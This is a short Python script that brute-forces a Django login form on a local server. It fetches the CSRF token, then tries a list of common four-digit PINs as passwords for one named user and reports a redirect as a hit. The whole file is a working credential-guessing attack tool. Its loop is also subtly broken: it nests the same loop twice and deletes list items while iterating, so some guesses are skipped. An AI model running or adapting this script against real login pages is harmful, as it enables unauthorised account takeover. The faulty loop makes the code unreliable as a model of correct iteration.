import requests
from bs4 import BeautifulSoup

username = "kristian"  # Change this
login_url = "http://127.0.0.1:8000/accounts/login/"
common_patterns = [
        "1234", "0000", "1111", "2222", "3333", "4444", "5555", 
        "6666", "7777", "8888", "9999", "4321", "5678", "6789",
        "1212", "1122", "1230", "2020", "1999", "2000", "1984"
]

session = requests.Session()
response = session.get(login_url)

print("GET:", response.status_code)

soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrfmiddlewaretoken"})

if not csrf:
    print("CSRF token not found")
    exit()

csrf_token = csrf["value"]

def force():
    for password in common_patterns:
        try:
        
            for password in common_patterns:
                response = session.post(
                    login_url,
                    data={
                        "username": username,
                        "password": password,
                        "csrfmiddlewaretoken": csrf_token,
                    },
                    headers={
                        "Referer": login_url
                    },
                    allow_redirects=False
                )

                print(password, response.status_code, response.headers.get("Location"))
                if response.status_code == 302:
                    print(f"\n Found: {password}")
                    return
                common_patterns.remove(password)


        except requests.exceptions.ConnectionError:
            print("\n ERROR: Cannot connect to server!")
            print("Make sure Django is running on http://127.0.0.1:8000")
            break

    return print("Password not found")

if __name__ == "__main__":
    force()